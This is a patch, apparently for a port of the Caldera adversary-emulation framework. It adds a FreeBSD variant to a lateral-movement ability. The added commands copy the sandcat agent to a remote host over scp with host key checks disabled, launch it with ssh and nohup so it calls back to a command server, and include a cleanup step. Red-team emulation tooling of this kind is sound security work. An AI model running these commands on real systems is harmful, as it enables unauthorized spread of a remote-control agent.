@@ -1,0 +1,16 @@
+--- plugins/stockpile/data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml.orig	2022-09-14 02:24:22 UTC
++++ plugins/stockpile/data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml
+@@ -24,4 +24,13 @@
+           ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
+         payloads:
+         - sandcat.go-linux
++    freebsd:
++      sh:
++        command: |
++          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-freebsd #{remote.ssh.cmd}:~/sandcat.go &&
++          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
++        cleanup: |
++          ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
++        payloads:
++        - sandcat.go-freebsd         
+   singleton: True
